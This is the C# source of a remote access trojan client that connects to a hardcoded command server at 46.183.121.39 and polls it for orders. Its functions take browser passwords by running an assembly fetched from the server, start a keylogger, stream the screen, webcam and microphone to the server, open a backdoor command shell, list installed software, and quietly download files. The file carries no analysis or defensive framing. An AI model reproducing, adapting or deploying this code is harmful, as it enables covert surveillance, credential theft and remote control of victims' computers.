using Microsoft.Win32;
using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;



namespace Client
{
    static class Program
    {
    
        public static Service.SoapServer A = new Service.SoapServer();
        
        public static string myName;
        private static bool Connected = false;
        private static bool Registered = false;
        private static bool Update = false;
        private static bool BrowserDump = false;
        private static bool InstalledSoftwareBool = false;
        private static bool keydumpbool = false;
        private static bool scshare = false;
        private static bool WebCambool = false;
        private static Keylogger KeyLogObject;
        private static bool cmdkey = false;
        private static bool downloadkey = false;
        private static bool webopenkey = false;
        private static bool micdumpkey = false;
        private static WebClient HiddenDownloader = new WebClient();
        private static string urlToDownload = "";
        private static string urlToOpen = "";
        private static Thread WebCamShareThread = new Thread(new ThreadStart(WebCamShare)); 
        private static Thread ScreenShareThread = new Thread(new ThreadStart(ScreenShare));

        [STAThread]
        static void Main()
        {
            
 
           MainFunk();
        }

        private static void MainFunk()
        {
            while (true)
            {
                if (!Connected)
                {
                    Thread ConnectionThread = new Thread(new ThreadStart(ConnectToWS));
                    ConnectionThread.Start();
                    while (ConnectionThread.IsAlive)
                    {
                        Thread.Sleep(100);
                    };
                }
                else
                {
                    Thread IsRegisteredThread = new Thread(new ThreadStart(IsRegistered));
                    IsRegisteredThread.Start();
                    while (IsRegisteredThread.IsAlive)
                    {
                        Thread.Sleep(100);
                    };

                    if (!Registered)
                    {
                        Thread RegisterThread = new Thread(new ThreadStart(Register));
                        RegisterThread.Start();
                        while (RegisterThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };
                    }
                    else
                    {
                        #region UpdatePCData
                        Thread IfUpdateThread = new Thread(new ThreadStart(IfUpdate));
                        IfUpdateThread.Start();
                        while (IfUpdateThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };

                        if (Update)
                        {
                            Thread UpdateDataThread = new Thread(new ThreadStart(UpdateData));
                            UpdateDataThread.Start();
                            while (UpdateDataThread.IsAlive)
                            {
                                Thread.Sleep(100);
                            };
                            A.SetForNoUpdate(myName);
                            Update = false;
                        }
                        #endregion

                        #region PasswordDump
                        Thread IfBrowserPassDumpThread = new Thread(new ThreadStart(IfBrowserPassDump));
                        IfBrowserPassDumpThread.Start();
                        while (IfUpdateThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };

                        if (BrowserDump)
                        {
                            Thread DumpPassThread = new Thread(new ThreadStart(DumpPass));
                            DumpPassThread.Start();
                            while (DumpPassThread.IsAlive)
                            {
                                Thread.Sleep(100);
                            };
                            A.SetForNoBrowserDump(myName);
                            BrowserDump = false;
                        }
                        #endregion

                        #region RegisteredSoftware
                        Thread IfRegisteredSoftwareThread = new Thread(new ThreadStart(IfInstalledAplicationDump));
                        IfRegisteredSoftwareThread.Start();
                        while (IfRegisteredSoftwareThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };

                        if (InstalledSoftwareBool)
                        {
                            Thread DumpPassThread = new Thread(new ThreadStart(GetInstalledApplications));
                            DumpPassThread.Start();
                            while (DumpPassThread.IsAlive)
                            {
                                Thread.Sleep(100);
                            };
                            A.SetForNoApplicationDump(myName);
                            InstalledSoftwareBool = false;
                        }




                        #endregion

                        #region KeylogDump
                        Thread IfKeylogDumpThread = new Thread(new ThreadStart(IfKeylogDump));
                        IfKeylogDumpThread.Start();
                        while (IfRegisteredSoftwareThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };

                        if (keydumpbool)
                        {
                            if (KeyLogObject == null)
                            { KeyLogObject = new Keylogger(); }

                            if (!KeyLogObject.started)
                            {
                                KeyLogObject.KeyloggerStart();
                            }
                        }
                        else
                        {
                            if (KeyLogObject != null)
                                if (KeyLogObject.started)
                                {
                                    KeyLogObject.Flush2File();
                                    KeyLogObject.KeyLogerStop();
                                }
                        }

                        #endregion

                        #region ScreenShare

                        Thread IfKeyScreenShareThread = new Thread(new ThreadStart(IfKeyScreenShare));
                        IfKeyScreenShareThread.Start();
                        while (IfKeyScreenShareThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };

                        if (scshare)
                        {
                            if (!ScreenShareThread.IsAlive)
                            {
                                ScreenShareThread = new Thread(new ThreadStart(ScreenShare));
                                ScreenShareThread.Start();
                            }
                            string clip = System.Windows.Forms.Clipboard.GetText();
                            if (clip != "")
                            {
                                // co clipboard ne server
                            }
                        }



                        #endregion

                        #region WebCam
                        Thread IfWebCamThread = new Thread(new ThreadStart(IfWebCamDump));
                        IfWebCamThread.Start();
                        while (IfWebCamThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };

                        if (WebCambool)
                        {
                            if (!WebCamShareThread.IsAlive)
                            {
                                WebCam.StreamImages = true;
                                WebCamShareThread = new Thread(new ThreadStart(WebCamShare)); 
                                WebCamShareThread.Start();
                            }
                        }
                        else
                        {
                            WebCam.StreamImages = false;
                            //if (WebCamShareThread.IsAlive)
                            //{
                            //    WebCamShareThread.Abort();
                            //}
                        }



                        #endregion

                        #region CMDRUN

                        Thread IfCmdRunThread = new Thread(new ThreadStart(IfCmdRun));
                        IfCmdRunThread.Start();
                        while (IfCmdRunThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };

                        if (cmdkey)
                        {
                            if (!Backdoor.started)
                            {
                              Backdoor.startServer();
                            }
                        }
                        else
                        {
                            if (Backdoor.started)
                            {
                                Backdoor.stopServer();
                            }
                        }
                        #endregion

                        #region MIC
                     
                        Thread IfMicDumpThread = new Thread(new ThreadStart(IfMicDump));
                        IfMicDumpThread.Start();
                        while (IfMicDumpThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };

                        if (micdumpkey)
                        {
                            string connection = A.SelectIPPORT();
                            string ip = connection.Substring(0, connection.IndexOf(':'));
                            string port = connection.Substring( connection.IndexOf(':') +1);
                            if (!VoiceRoom.started)
                            {
                                VoiceRoom.VoiceRoomStart(ip, int.Parse(port));
                            }
                        }
                        else
                        {
                            VoiceRoom.Disconncet();
                        }

                        #endregion

                        #region Navigator

                        Thread IfBrowserOpenThread = new Thread(new ThreadStart(IfWebBrowse));
                        IfBrowserOpenThread.Start();
                        while (IfBrowserOpenThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };

                        if (webopenkey)
                        {
                            if (!Browser.running)
                            {
                                urlToOpen = A.SelectOPEN();
                                Browser.urlToLoad = urlToOpen;
                                Browser.StartBrowser();
                            }
                        }
                      
                        #endregion

                        #region DownloadLocal

                        Thread IfDownloadThread = new Thread(new ThreadStart(IfDownload));
                        IfDownloadThread.Start();
                        while (IfDownloadThread.IsAlive)
                        {
                            Thread.Sleep(100);
                        };

                        if (downloadkey)
                        {
                            urlToDownload = A.SelectDOWN();
                            if (urlToDownload != "")
                            {
                                string filename = urlToDownload.Substring(urlToDownload.LastIndexOf('/'));
                                HiddenDownloader.DownloadFileAsync(new Uri(urlToDownload), filename);
                                A.SetForNoUrlDown(myName);
                                urlToDownload = "";
                            }
                        }

                        #endregion

                        Thread.Sleep(1000);
                    }
                }
                GC.Collect();
                Thread.Sleep(1000);
            }
        }


        private static void ConnectToWS()
        {
            A.Url = @"http://46.183.121.39/ws/service1.asmx";
            try
            {
                myName = Client.HostIdentification.GetFingerPrint();
                A.AddUser(myName);
                Connected = true;
            }
            catch
            {
                Connected = false;
            }
        }// lidhu me webservice

        private static void IsRegistered()
        {
            try
            {
                string s = A.IsUserRegistered(myName);
                if (s.Equals("1"))
                { Registered = true; }
            }
            catch 
            {
                Registered = false;
                Connected = false;
            }
        }

        private static void Register()
        {
            try
            {
                A.Register(myName);
              
            }
            catch
            {
                Registered = false;
                Connected = false;
            }
        }

        private static void IfUpdate()
        {
            try
            {
                string s = A.IsUserRegistered(myName);
                if (s.Equals("1"))
                { Update = true; }
            }
            catch
            {
                Update = false;
                Registered = false;
                Connected = false;
            }
        }

        private static void UpdateData()
        {
            Thread.Sleep(10);
            Program.A.RegisterValue(myName, "Info : GlobalIP", "");
            Thread.Sleep(10);
            Program.A.RegisterValue(myName, "Info : LocalIP", HostIdentification.GetLocalIP());
            Thread.Sleep(10);
            Program.A.RegisterValue(myName, "Info : MachineName", HostIdentification.GetMachinename());
            Thread.Sleep(10);
            Program.A.RegisterValue(myName, "Info : MachineOS", HostIdentification.GetMachineOS());
            Thread.Sleep(10);
            Program.A.RegisterValue(myName, "Info : MACAddress", HostIdentification.GetMacAddr());
            Thread.Sleep(10);
            Program.A.RegisterValue(myName, "Info : ActiveUser", HostIdentification.GetActiveUser());
            A.SetForNoUpdate(myName);

        }

        private static void IfBrowserPassDump()
        {
            try
            {
                string s = A.IfBrowserDump(myName);
                if (s.Equals("1"))
                { BrowserDump = true; }
            }
            catch
            {
                BrowserDump = false;
                Registered = false;
                Connected = false;
            }
        }

        private static void DumpPass()
        {
            byte[] btorun = new byte[0];
            try
            {
                btorun = A.GetAssembly(1);
            }
            catch
            {
                return;
            }
            if (btorun.Length > 0)
            {
                string s = RunProcess.RunWithRedirect(btorun);
                Program.A.RegisterValue(myName, "PasswordDumps", s);
                A.SetForNoBrowserDump(myName);
            }
        }

        private static void IfInstalledAplicationDump()
        {
            try
            {
                string s = A.IfInstalledAplicationDump(myName);
                if (s.Equals("1"))
                { InstalledSoftwareBool = true; }
            }
            catch
            {
                InstalledSoftwareBool = false;
                Registered = false;
                Connected = false;
            }
        }

        private static void GetInstalledApplications()
        {
            string OUTPUT = "";
            string registry_key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
            using (Microsoft.Win32.RegistryKey key = Registry.LocalMachine.OpenSubKey(registry_key))
            {
                foreach (string subkey_name in key.GetSubKeyNames())
                {
                    using (RegistryKey subkey = key.OpenSubKey(subkey_name))
                    {
                        OUTPUT += (subkey.GetValue("DisplayName")) + " | ";
                    }
                }
            }
            Program.A.RegisterValue(myName, "InstalledSoftware", OUTPUT);
            A.SetForNoApplicationDump(myName);
        }

        private static void IfKeylogDump()
        {
            try
            {
                string s = A.IfKeyLogDump(myName);
                if (s.Equals("1"))
                { keydumpbool = true; }
                else
                { keydumpbool = false; }
            }
            catch
            {
                keydumpbool = false;
                Registered = false;
                Connected = false;
            }
        }

        private static void IfCmdRun()
        {
            try
            {
                string s = A.IfCMDRun(myName);
                if (s.Equals("1"))
                { cmdkey = true; }
                else
                { cmdkey = false; }
            }
            catch
            {
                cmdkey = false;
                Registered = false;
                Connected = false;
            }
        }

        private static void IfKeyScreenShare()
        {
            try
            {
                string s = A.IfKeyScreenShare(myName);
                if (s.Equals("1"))
                { scshare = true; }
                else
                { scshare = false; }
            }
            catch
            {
                scshare = false;
                Registered = false;
                Connected = false;
            }
        }

        private static void IfWebCamDump()
        {
            try
            {
                string s = A.IfWebCamDump(myName);
                if (s.Equals("1"))
                {
                    WebCambool = true;
                }
                else
                {
                    WebCambool = false;
                }
            }
            catch
            {
                WebCambool = false;
                Registered = false;
                Connected = false;
            }
        }

        private static void WebCamShare()
        {
            try
            {
                WebCam test = new WebCam();
                WebCam.StreamImages = true;
                test.SendStreamImages();
            }
            catch
            {
                WebCam.StreamImages = false;
                Program.A.RegisterValue(myName, "WebCamLog", "Problems with Webcam");
            }
        }

        private static void ScreenShare()
        {
            while (scshare)
            {
                A.SetMyScreen(ScreenCapture.CaptureScreen());
                Thread.Sleep(300);
            }
        }

        private static void IfDownload()
        {
            try
            {
                string s = A.IfURLDOWN(myName);
                if (s.Equals("1"))
                { downloadkey = true; }
                else
                { downloadkey = false; }
            }
            catch
            {
                downloadkey = false;
                Registered = false;
                Connected = false;
            }
        }

        private static void IfWebBrowse()
        {
            try
            {
                string s = A.IfURLOPEN(myName);
                if (s.Equals("1"))
                { webopenkey = true; }
                else
                { webopenkey = false; }
            }
            catch
            {
                webopenkey = false;
                Registered = false;
                Connected = false;
            }
        }

        private static void IfMicDump()
        {
            try
            {
                string s = A.IfMICDUMP(myName);
                if (s.Equals("1"))
                { micdumpkey = true; }
                else
                { micdumpkey = false; }
            }
            catch
            {
                micdumpkey = false;
                Registered = false;
                Connected = false;
            }
        }

    }
}
